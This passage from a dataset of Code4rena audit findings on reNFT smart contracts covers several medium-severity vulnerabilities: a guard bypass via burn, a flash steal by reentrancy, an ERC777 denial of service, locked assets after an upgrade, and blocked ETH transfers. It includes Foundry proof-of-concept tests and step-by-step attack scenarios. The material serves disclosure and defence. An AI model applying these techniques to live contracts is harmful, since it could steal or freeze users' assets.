Txn reverts with error `GuardPolicy_FunctionSelectorRequired`\n        vm.expectRevert(abi.encodeWithSelector(Errors.GuardPolicy_FunctionSelectorRequired.selector));\n        _executeTransaction(\n            address(alice.safe),\n            Enum.Operation.Call,\n            address(receiver),\n            1 ether,\n            new bytes(0),\n            transactionSignature,\n            new bytes(0)\n        );\n        // ETH remains stuck in Alice's ReNFT safe\n        assertEq(address(alice.safe).balance, 1 ether);\n        assertEq(receiver.balance, 1 ether);\n    }\n\n    function _signTransaction(\n        address safe,\n        Enum.Operation operation,\n        uint256 ownerPrivateKey,\n        address to,\n        uint256 value,\n        bytes memory transaction\n    ) private view returns (bytes memory transactionSignature) {\n        // get the safe nonce\n        uint256 nonce = ISafe(safe).nonce();\n\n        // get the eip712 compatible transaction hash that the safe owner will sign\n        bytes32 transactionHash = ISafe(safe).getTransactionHash(\n            to,\n            value,\n            transaction,\n            operation,\n            0 ether,\n            0 ether,\n            0 ether,\n            address(0),\n            payable(address(0)),\n            nonce\n        );\n\n        // sign the transaction\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivateKey, transactionHash);\n        transactionSignature = abi.encodePacked(r, s, v);\n    }\n    function _executeTransaction(\n        address safe,\n        Enum.Operation operation,\n        address to,\n        uint256 value,\n        bytes memory transaction,\n        bytes memory signature,\n        bytes memory expectedError\n    ) private {\n        // expect an error if error data was provided\n        if (expectedError.length != 0) {\n            vm.expectRevert(expectedError);\n        }\n\n        // execute the transaction\n        ISafe(safe).execTransaction(\n            to,\n            value,\n            transaction,\n            operation,\n            0 ether,\n            0 ether,\n            0 ether,\n            address(0),\n            payable(address(0)),\n            signature\n        );\n    }\n}\n\n```\n\n</details>\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nConsider allowing `data.length` to be `0` as that will be used for performing native ETH transfers.\n\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/292#issuecomment-1913746798):**\n > See comment on [issue 261](https://github.com/code-423n4/2024-01-renft-findings/issues/261#issuecomment-1913746141).\n\n**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/292#issuecomment-1915464362):**\n > Agree that this is a valid M vulnerability.\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/6) - Allows native ETH to be transferred out of a rental safe.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/54) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/56).\n***\n\n",
      "summary": "\nThe `Guard::checkTransaction` function in the Safe contracts unintentionally prevents users from transferring native ETH from their safes. This is because the function requires transaction data to be at least 4 bytes long, but native ETH transfers have empty data fields. As a result, users are unable to execute standard ETH transfers from their safes, which limits the functionality of the safes. A suggested solution is to allow for a data length of 0, which would enable native ETH transfers. The issue has been confirmed and mitigated by the reNFT team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/292",
      "tags": [],
      "finders": [
        "AkshaySrivastav",
        "KupiaSec"
      ]
    },
    {
      "id": "30535",
      "title": "[M-08] Assets in a Safe can be lost",
      "impact": "MEDIUM",
      "content": "\nThe `Guard.sol` contract is enabled on Safe's and uses the [`_checkTransaction`](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L195-L293) function to ensure that transactions that the Safe executes do not transfer the asset out of the Safe.\n\nThe `checkTransaction` function achieves this by isolating the function selector and checking that it is not a disallowed function selector. For instance: `safeTransferFrom`, `transferFrom`, `approve`, `enableModule`, etc.\n\nThe list does not, however, check for calls to `burn` the token, neither does it check if it is a `permit`. The sponsor has noted the following:\n\n> The [Guard](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol) contract can only protect against the transfer of tokens that faithfully\nimplement the ERC721/ERC1155 spec.\n\nBut this does not acknowledge the fact that an ERC721/ERC1155 implementation can still be an honest implementation and have extra functionality. In particular, the `burn` function is a common addition to many ERC721 contracts, usually granted through inheriting `ERC721Burnable`.\n\nFor example, the following projects all have a `burn` function, and Safe's protected by `Guard.sol` that hold these NFTs will be vulnerable to loss of assets via a malicious renter:\n\n*   [Pudgy Penguins](https://etherscan.io/address/0xbd3531da5cf5857e7cfaa92426877b022e612cf8#writeContract)\n*   [Lil Pudgies](https://etherscan.io/address/0x524cab2ec69124574082676e6f654a18df49a048#writeContract)\n*   [Oh Ottie](https://etherscan.io/address/0x7ff5601b0a434b52345c57a01a28d63f3e892ac0#code#F3#L45)\n\nThese are three that are in the top 10 projects on Opensea at the time of writing.\n\n### Proof of Concept\n\nWe can see in the `Guard.sol` file that certain function selectors are imported to be tested against:\n\n    import {\n        shared_set_approval_for_all_selector,\n        e721_approve_selector,\n        e721_safe_transfer_from_1_selector,\n        e721_safe_transfer_from_2_selector,\n        e721_transfer_from_selector,\n        e721_approve_token_id_offset,\n        e721_safe_transfer_from_1_token_id_offset,\n        e721_safe_transfer_from_2_token_id_offset,\n        e721_transfer_from_token_id_offset,\n        e1155_safe_transfer_from_selector,\n        e1155_safe_batch_transfer_from_selector,\n        e1155_safe_transfer_from_token_id_offset,\n        e1155_safe_batch_transfer_from_token_id_offset,\n        gnosis_safe_set_guard_selector,\n        gnosis_safe_enable_module_selector,\n        gnosis_safe_disable_module_selector,\n        gnosis_safe_enable_module_offset,\n        gnosis_safe_disable_module_offset\n    } from \"@src/libraries/RentalConstants.sol\";\n\nFrom the `_checkTransaction` function we see that there is no check for `burn`, `burnFrom` or `permit`.\n\nA malicious renter who is renting the asset can still execute `burn` (common), `burnFrom` (rare) or `permit` (popularized by [Uni v3](https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/base/ERC721Permit.sol#L52C9-L86)), which will lead to loss of the asset.\n\n### Coded PoC\n\nThe below test can be placed in the `CheckTransaction.t.sol` test file. It should be run with `forge test --match-test test_PoC -vvvv`\n\n        function test_PoC() public {\n            bytes4 burn_selector = 0x42966c68;\n            // Create a rentalId array\n            RentalAssetUpdate[] memory rentalAssets = new RentalAssetUpdate[](1);\n            rentalAssets[0] = RentalAssetUpdate(\n                RentalUtils.getItemPointer(address(alice.safe), address(erc721s[0]), 0),\n                1\n            );\n\n            // Mark the rental as actively rented in storage\n            _markRentalsAsActive(rentalAssets);\n\n            // Build up the `transferFrom(address from, address to, uint256 tokenId)` calldata\n            bytes memory burnCalldata = abi.encodeWithSelector(\n                burn_selector,\n                69\n            );\n\n            // Expect revert because of an unauthorized function selector\n            _checkTransactionRevertUnauthorizedSelector(\n                address(alice.safe),\n                address(erc721s[0]),\n                burn_selector,\n                burnCalldata\n            );\n        }\n\nThe console output is:\n\n    Encountered 1 failing test in test/unit/Guard/CheckTransaction.t.sol:Guard_CheckTransaction_Unit_Test\n    [FAIL. Reason: call did not revert as expected] test_PoC() (gas: 96093)\n\nThis shows that the `checkTransaction` would not protect against calls to `burn` the asset.\n\n### Recommended Mitigation Steps\n\nAlthough not a catch-all, adding checks for `burn`, `burnFrom` and `permit` functions (which are common in smart contracts) should prevent this in most cases.\n\nSelectors:\n\n*   `burn`: `0x42966c68`\n*   `burnFrom`: `0x1fe41211`\n*   `permit` : `0xabae8f0d`\n\nIn the `Guard.sol` file:\n\n<Details>\n\n```diff\n        } else if (selector == e1155_safe_transfer_from_selector) {\n            // Load the token ID from calldata.\n            uint256 tokenId = uint256(\n                _loadValueFromCalldata(data, e1155_safe_transfer_from_token_id_offset)\n            );\n\n            // Check if the selector is allowed.\n            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } else if (selector == burn_selector) {\n+           // Load the extension address from calldata.\n+           address extension = address(\n+               uint160(\n+                    uint256(\n+                       _loadValueFromCalldata(data, burn_selector_offset)\n+                   )\n+               )\n+           );\n+\n+            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } else if (selector == burn_From_selector) {\n+           // Load the extension address from calldata.\n+           address extension = address(\n+               uint160(\n+                    uint256(\n+                       _loadValueFromCalldata(data, burn_From_selector_offset)\n+                   )\n+               )\n+           );\n+\n+            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } else if (selector == permit_selector) {\n+           // Load the extension address from calldata.\n+           address extension = address(\n+               uint160(\n+                    uint256(\n+                       _loadValueFromCalldata(data, permit_selector_offset)\n+                   )\n+               )\n+           );\n+\n+            _revertSelectorOnActiveRental(selector, from, to, tokenId);\n+       } \n```\n</details>\n\n*Please note that there may be other flavours of the `permit` function that have different signatures.*\n\n**[141345 (Lookout) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1902725917):**\n > [Issue 587](https://github.com/code-423n4/2024-01-renft-findings/issues/587) has a detailed discussion about `permit()`.\n\n**[Alec1017 (reNFT) acknowledged and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1908940377):**\n > Non-standard ERC implementations were considered out of scope, but regardless we do plan on adding a whitelist for tokens interacting with the protocol\n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1912774849):**\n > Originally commented on https://github.com/code-423n4/2024-01-renft-findings/issues/587#issuecomment-1912630065\n> \n> But same thing applies here, I don't think this can be called out of scope but do think M is more appropiate.\n\n**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1915456905):**\n > Given the justification for #587, M severity seems fair.\n\n**[lokithe5th (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1916119263):**\n > @0xean thank you for your judging efforts. \n> \n> As the author of this submission I would like to highlight a mistake in my report: the Safe itself will not be calling the `permit()` function, only signing a transaction that approves a `permit`. Adding a check for the `permit` selector will not be effective. \n> \n> I draw attention to this fact because I do not want the sponsor to believe they have guarded against the `permit` vulnerability by implementing the suggested fix, while they may still in fact be vulnerable to it.\n> \n> However, the PoC and the suggested fix remain valid for `burn` and `burnFrom` functions. \n> \n> Credit to issue #587 and @stalinMacias for pointing this nuance out.\n\n**[0xStalin (Warden) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/323#issuecomment-1916150182):**\n > Thanks @lokithe5th. \n> \n> I believe this issue is completely valid in regards to the `burn` functionality and is providing the right mitigation for it.\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/5) - Added support for burnable ERC721 and ERC1155 tokens.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/53), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/55) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/14).\n\n***\n\n",
      "summary": "\nThe report discusses a vulnerability in the Guard.sol contract used on Safe's. The contract is responsible for ensuring that transactions do not transfer assets out of the Safe. However, the contract does not check for calls to the `burn` function or other functions such as `burnFrom` and `permit`, which can lead to loss of assets. The report provides a proof of concept and recommends adding checks for these functions to prevent the vulnerability. The sponsor has acknowledged the issue and plans to add a whitelist for tokens interacting with the protocol. The severity of the issue has been decreased to medium and the sponsor has implemented a fix.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/323",
      "tags": [
        "ERC1155",
        "ERC721",
        "NFT"
      ],
      "finders": [
        "rokinot",
        "yashar",
        "SBSecurity",
        "trachev",
        "0xAlix2",
        "juancito",
        "rbserver",
        "BI\\_security",
        "KupiaSec",
        "krikolkk",
        "Coverage",
        "anshujalan",
        "Qkite",
        "said",
        "EV\\_om",
        "roleengineer",
        "evmboi32",
        "oakcobalt",
        "1",
        "2",
        "Giorgio",
        "hals",
        "LokiThe5th"
      ]
    },
    {
      "id": "30534",
      "title": "[M-07] Upgrading modules via `executeAction()` will brick all existing rentals",
      "impact": "MEDIUM",
      "content": "\nAll assets from rentals pre-upgrade will be locked. Users can't recover them as old rentals can't be stopped.\n\n### Proof of Concept\n\nThe protocol has a functionality to [upgrade modules via `Kernel::executeAction()`](https://github.com/re-nft/smart-contracts/blob/main/src/Kernel.sol#L285).\n\nThat upgrade functionality [performs some checks, initializes the new modules, and reconfigures policies](https://github.com/re-nft/smart-contracts/blob/main/src/Kernel.sol#L383-L411), but it doesn't migrate any data, nor transfer any assets.\n\nModules can hold assets, such as in the case of the `PaymentEscrow`, as well as keeping rentals states in storage.\n\nThe [current implementation of the `PaymentEscrow`](https://github.com/re-nft/smart-contracts/blob/main/src/modules/PaymentEscrow.sol) for example doesn't have any mechanism for migrations, or to stop rentals, or withdraw assets if the module was upgraded via `executeAction()`.\n\nThis will result in all previous rentals assets being locked, as rentals can no longer be stopped.\n\nThe following POC proves that old rentals can't be stopped, as well as showing how the old contract is still holding the users funds.\n\nCreate a new test in `smart-contracts/test/integration/Upgrade.t.sol` with this code:\n\n<Details>\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {\n    Order,\n    FulfillmentComponent,\n    Fulfillment,\n    ItemType as SeaportItemType\n} from \"@seaport-types/lib/ConsiderationStructs.sol\";\n\nimport {Errors} from \"@src/libraries/Errors.sol\";\nimport {OrderType, OrderMetadata, RentalOrder} from \"@src/libraries/RentalStructs.sol\";\n\nimport {BaseTest} from \"@test/BaseTest.sol\";\nimport {ProtocolAccount} from \"@test/utils/Types.sol\";\n\nimport {SafeUtils} from \"@test/utils/GnosisSafeUtils.sol\";\nimport {Safe} from \"@safe-contracts/Safe.sol\";\n\nimport {SafeL2} from \"@safe-contracts/SafeL2.sol\";\nimport {PaymentEscrow} from \"@src/modules/PaymentEscrow.sol\";\nimport {Proxy} from \"@src/proxy/Proxy.sol\";\n\nimport {Kernel, Actions} from \"@src/Kernel.sol\";\n\ncontract UpgradeDrain is BaseTest {\n    function test_StopRent_UpgradedModule() public {\n        // create a BASE order\n        createOrder({\n            offerer: alice,\n            orderType: OrderType.BASE,\n            erc721Offers: 1,\n            erc1155Offers: 0,\n            erc20Offers: 0,\n            erc721Considerations: 0,\n            erc1155Considerations: 0,\n            erc20Considerations: 1\n        });\n\n        // finalize the order creation\n        (\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) = finalizeOrder();\n\n        // create an order fulfillment\n        createOrderFulfillment({\n            _fulfiller: bob,\n            order: order,\n            orderHash: orderHash,\n            metadata: metadata\n        });\n\n        // finalize the base order fulfillment\n        RentalOrder memory preUpgradeRental = finalizeBaseOrderFulfillment();\n\n        bytes memory paymentEscrowProxyInitCode = abi.encodePacked(\n            type(Proxy).creationCode,\n            abi.encode(\n                address(paymentEscrowImplementation),\n                abi.encodeWithSelector(\n                    PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,\n                    address(kernel)\n                )\n            )\n        );\n\n        // <<Upgrade the Escrow contract >>\n\n        PaymentEscrow OLD_ESCRW = ESCRW;\n\n        bytes12 protocolVersion = 0x000000000000000000000420;\n        bytes32 salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n        vm.prank(deployer.addr);\n        PaymentEscrow NEW_ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));\n\n        vm.prank(deployer.addr);\n        kernel.executeAction(Actions.UpgradeModule, address(NEW_ESCRW));\n\n        // speed up in time past the rental expiration\n        vm.warp(block.timestamp + 750);\n\n        bytes32 payRentalOrderHash = create.getRentalOrderHash(preUpgradeRental);\n\n        // assert that the rent still exists\n        assertEq(STORE.orders(payRentalOrderHash), true);\n        assertEq(STORE.isRentedOut(address(bob.safe), address(erc721s[0]), 0), true);\n\n        // assert that the ERC20 tokens are on the OLD contract\n        assertEq(erc20s[0].balanceOf(address(OLD_ESCRW)), uint256(100));\n        assertEq(erc20s[0].balanceOf(address(NEW_ESCRW)), uint256(0));\n\n        // assert that the token balances are in the OLD contract and haven't been migrated\n        assertEq(OLD_ESCRW.balanceOf(address(erc20s[0])), uint256(100));\n        assertEq(NEW_ESCRW.balanceOf(address(erc20s[0])), uint256(0));\n\n        // The rental can no longer be stopped\n        vm.expectRevert();\n        vm.prank(alice.addr);\n        stop.stopRent(preUpgradeRental);\n    }\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nProvide a method for users to migrate old rentals to the upgraded contracts, such as a `migrate()` function, executable by them or the protocol.\n\nAnother way is to provide a way to stop all rentals before the upgrade, in order to start with a fresh new module, or allow users to stop rentals from old modules.\n\n\n**[Alec1017 (reNFT) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/397#issuecomment-1910471559):**\n > This is intended behavior. Upgrading modules is seen as an extremely rare thing, which will only be done in the absense of active rentals.\n> \n> Would probably be more appropriate for this to be QA.\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/397#issuecomment-1914420417):**\n > @Alec1017 - How would this state be achieved? If the protocol is seeing broad adoption it seems likely that there are essentially always going to be outstanding rentals with no clear ability to recall them all.\n\n**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/397#issuecomment-1915453926):**\n> Our co-signing technique allows us to stop signing off on allowing new rentals, so if we wanted to upgrade everything, we would stop co-signing on orders that use the old contracts and wait for all active orders to expire.\n> \n> Of course, this only works when a max rent duration is introduced, which is a planned mitigation for this audit.\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/397#issuecomment-1915659794):**\n > Thanks. I think M is the correct severity since the code as audited doesn't practically allow for this functionality to work without major implications.  Even with a max duration, essentially pausing the protocol for that long is a DOS and probably means M is correct.\n\n**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/397#issuecomment-1917105555):**\n > Hey there, I dont think I was very clear about the point of upgrading in this manner. Upgrading via the kernel is not meant to be the \"normal\" way a storage contract is upgraded, this is why they're proxies as well.\n> \n> Our protocol is modular, which allows the deployment of multiple versions of the same contracts. In the future, you could imagine multiple iterations of our protocol being introduced, which can be rolled in and out simultaneously. We can choose to deprecate one storage module by only allowing people to stop rentals via the situation i described above, and also allow them to initiate rentals with newer versions.\n> \n> Hopefully this is helpful context!\n\n***\n\n",
      "summary": "\nThe bug report discusses a functionality in the protocol that allows for upgrading modules via `Kernel::executeAction()`. However, this upgrade does not migrate any data or transfer any assets, which can result in all previous rental assets being locked and users not being able to recover them. The report includes a proof of concept that shows how old rentals cannot be stopped and the old contract still holds the users' funds. The recommended mitigation steps include providing a method for users to migrate their rentals to the upgraded contracts or allowing them to stop rentals from old modules. The severity of this issue is debated, with some suggesting it should be marked as a medium severity due to the potential for a denial of service attack. The developers explain that upgrading via the kernel is not meant to be the \"normal\" way of upgrading, and the protocol is designed to be modular, allowing for multiple versions to be deployed simultaneously. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/397",
      "tags": [],
      "finders": [
        "evmboi32",
        "trachev",
        "juancito",
        "oakcobalt"
      ]
    },
    {
      "id": "30533",
      "title": "[M-06] Incorrect ordering for deletion allows to flash steal rented NFT's",
      "impact": "MEDIUM",
      "content": "\nUser's can flash steal NFT's circumventing any restrictions imposed on the NFT\n\n### Proof of Concept\n\nWhen stopping a rental,the rented asset (ERC721/ERC1155) is transferred before the actual existance of the order is checked.\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L293-L302>\n\n```solidity\n        // @audit rented assets are transferred here\n        _reclaimRentedItems(order);\n\n        ESCRW.settlePayment(order);\n\n        // @audit this is where the existance of the order is actually verified\n        STORE.removeRentals(\n            _deriveRentalOrderHash(order),\n            _convertToStatic(rentalAssetUpdates)\n        );\n```\n\nSince ERC721/ERC1155 transfers invoke the `onReceived` functions in case of a contract receiver, it allows an attacker to create a rental order after stopping it first. This gives the attacker unrestricted access to the rented NFT.\n\n### Example Scenario\n\n1.  Attacker rents a restricted NFT N.\n2.  Attacker calls stopRent with a non-existing PAY order(pay order's allow to stop the rent at the same block as creation) keeping the offer item as NFT N and creator as an attacker controlled contract.\n3.  Since order existance check is done only at last, NFT N is transferred to the attacker's contract.\n4.  Attacker performs anything he wants to do with the NFT bypassing any restrictions imposed.\n5.  Attacker creates the order and fills it in seaport (attacker can obtain the server signature earlier itself or replay the signature of a similar order). This will populate the orderHash in the existing orders mapping.\n6.  The initial execution inside stopRent continues without reverting since the order is now actually a valid one.\n\n### POC Code\n\n<https://gist.github.com/10xhash/a6eb9552314900483a1cffe91243a169>\n\n### Recommended Mitigation Steps\n\nCheck for the order existance initially itself in the stopRent function\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/466#issuecomment-1914414758):**\n > Would be good to get sponsor comment here. For context see previous comment chain [here](https://github.com/code-423n4/2024-01-renft-findings/issues/237#issuecomment-1913253755).\n\n\n**[Alec1017 (reNFT) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/466#issuecomment-1915105583):**\n > Tested out the PoC. I believe it to be a valid PoC that correctly demonstrates the concept.\n> \n> However, the asset cannot be \"stolen\" since it must be given back to the rental safe by the time the \"flash steal\" ends.\n> \n> So, I wouldnt say it results in direct loss of funds, or even temporary freezing of funds.\n> \n> I will say that this does allow the attacker to interact with the asset in any way they see fit, which directly bypasses restrictions that the lender enables via hook contracts. I could see an example where a flash stolen NFT is used with a function selector on a contract to interact with some on-chain game, which the lender may have explicitly wanted to forbid. \n> \n> But I'll leave the final decision on the severity to the judges on this.\n\n**[0xean (Judge) decreased severity to Medium](https://github.com/code-423n4/2024-01-renft-findings/issues/466#issuecomment-1915639168)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/13) - Checks if a rental order exists right away when stopping a rental. Prevents stopping of an order that doesn't exist, only to create it during a callback in the `stopRent()` execution flow.\n\n**Status:** Mitigation confirmed. Full details in reports from [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/13), [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/52) and [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/40).\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the reNFT smart contracts that could allow users to bypass restrictions on non-fungible tokens (NFTs). The Proof of Concept provided shows that when stopping a rental, the rented asset is transferred before checking if the rental order exists. This allows an attacker to create a rental order after stopping it, giving them unrestricted access to the NFT. The report also includes a recommended mitigation step to check for the order's existence before transferring the asset. The severity of the vulnerability was initially deemed high, but after further discussion, it was decreased to medium. The reNFT team has confirmed the vulnerability and provided a mitigation in their code. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/466",
      "tags": [],
      "finders": [
        "hash",
        "1",
        "2",
        "piyushshukla"
      ]
    },
    {
      "id": "30532",
      "title": "[M-05] DOS possible while stopping a rental with erc777 tokens",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L100>\n\nIf an order involves erc777 token for a pay order then in the `tokensReceived` callback the renter can create DOS situation resulting in the lender's assets being stuck in the rental safe.\n\n### Proof of Concept\n\n[ERC777 token standard](https://eips.ethereum.org/EIPS/eip-777) which is backward compatible with `erc20` implies that on the transfer of the tokens the recipient can implement a `tokensReceived` hook to notify of any increment of the balance.\n\nNow suppose a pay order is created with an erc 777 consideration asset as there is no restriction on that and also the eip specifies that\n\n    The difference for new contracts implementing ERC-20 is that tokensToSend and tokensReceived hooks take precedence over ERC-20. Even with an ERC-20 transfer and transferFrom call, the token contract MUST check via ERC-1820 if the from and the to address implement tokensToSend and tokensReceived hook respectively. If any hook is implemented, it MUST be called. Note that when calling ERC-20 transfer on a contract, if the contract does not implement tokensReceived, the transfer call SHOULD still be accepted even if this means the tokens will probably be locked.\n\nSo the `tokensReceived` hook is optional for a `transfer/transferFrom` call. Hence sending the assets from the lender's wallet to the escrow contract shouldn't be an issue.\n\nNow when the rental period is over or in/between, the `stopRent` method in stop policy is called, which calls `settlePayment` in escrow module. Now on the token transfer\n\n            (bool success, bytes memory data) = token.call(\n                abi.encodeWithSelector(IERC20.transfer.selector, to, value)\n            );\n\nThe `tokensReceived` hook if implemented by the renter, would be called and they could just `revert the tx` inside the `tokensReceived` hook which would mean that the assets lent by the lender are locked forever.\n\n### Recommended Mitigation Steps\n\nIt is recommended to prohibit erc777 tokens from being used as consideration items.\n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/487#issuecomment-1917115475):**\n> Batching all the ERC777 token issues together.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/487#issuecomment-1922080633)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/7) - Implements a whitelist so only granted assets can be used in the protocol.<br>\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/17) - Implements batching functionality for whitelisting tokens so that multiple can be added at once.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/51), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/39) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/12).\n***\n\n",
      "summary": "\nThe bug report discusses a potential issue in the code for a smart contract. The problem arises when a user creates a pay order using a specific type of token, called erc777. This token has a feature that allows the recipient to implement a special function to notify when the token balance increases. However, if a renter (the person borrowing the assets) creates a pay order with this type of token and then intentionally reverts the transaction, it could cause the lender's (the person lending the assets) assets to become stuck in the rental safe. This is because the code does not account for this type of situation and the assets are not returned to the lender.\n\nTo fix this issue, the report recommends prohibiting the use of erc777 tokens as consideration items. The severity of the bug was initially considered high, but after further review, it was downgraded to medium. The team responsible for the code has confirmed the issue and implemented a solution to mitigate it. The solution includes implementing a whitelist to only allow approved assets to be used in the protocol and adding a feature to allow multiple tokens to be added to the whitelist at once. The mitigation has been confirmed and further details can be found in the mitigation reports.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "reNFT",
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/487",
      "tags": [
        "ERC777"
      ],
      "finders": [
        "BARW",
        "CipherSleuths"
      ]
    },
    {
      "id": "30531",
      "title": "[M-04] DoS of Rental stopping mechanism",
      "impact": "MEDIUM",
      "content": "\nThe `Guard::updateHookStatus` function is designed to allow protocol administrators to manage the status of hooks within the system. Hooks serve as essential components that customize and control flow of transactions within the protocol.\n\nThe vulnerability occurs when administrators disable the `onStop` hook using `Guard::updateHookStatus`. If the `onStop` hook gets disabled after a rental is created using that hook then that causes critical disruption in the rental closing flow.\n\nThis happens because the hook address is supplied by lender and renter at the time of rental creation, Both `onStart` and `onStop` gets executed on that user provided address at rental creation and stoppage respectively. Once a rental gets created its hook address cannot be modified. If the `onStop` hook gets disabled while the rental was active then the `stopRent` transaction will always revert.\n\n```solidity\n        if (!STORE.hookOnStop(target)) {\n            revert Errors.Shared_DisabledHook(target);\n        }\n```\n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L210-L212>\n\n### Proof of Concept\n\n1.  Suppose the `onStart` and `onStop` hooks are initially set as active by administrators for a particular contract address.\n2.  A user creates a rental transaction, and a whitelisted hook address is given as input.\n3.  The `onStart` hook gets executed as part of the rental creation process.\n4.  After some time, an administrator decides to disable the `onStop` hook for the same contract address.\n5.  As a result, users are unable to stop the rental, as the `onStop` hook will always revert any attempt to do so.\n\nThis sequence of events can result in situations where rentals cannot be stopped due to the disabling of critical hooks, causing potential issues and disruptions within the protocol.\n\nThe assets of lender and ERC20 payments will remain stuck in the renter's safe and escrow contract respectively.\n\nSince this bug is dependent upon an admin interaction I am reporting it as `medium`.\n\nThe following foundry test shows the process described above. Add this test case in `test/hooks/restricted-selector/RestrictedSelectorHook.t.sol` file and run using command `forge test --mp test/hooks/restricted-selector/RestrictedSelectorHook.t.sol`.\n\n<details>\n<summary>\nClick to expand Foundry Test\n</summary>\n\n```javascript\n function test_toggle_hook_status() public {\n     // create a bitmap that will disable the `train()` function selector\n     uint256 bitmap = 1;\n\n     // Define the hook for the rental\n     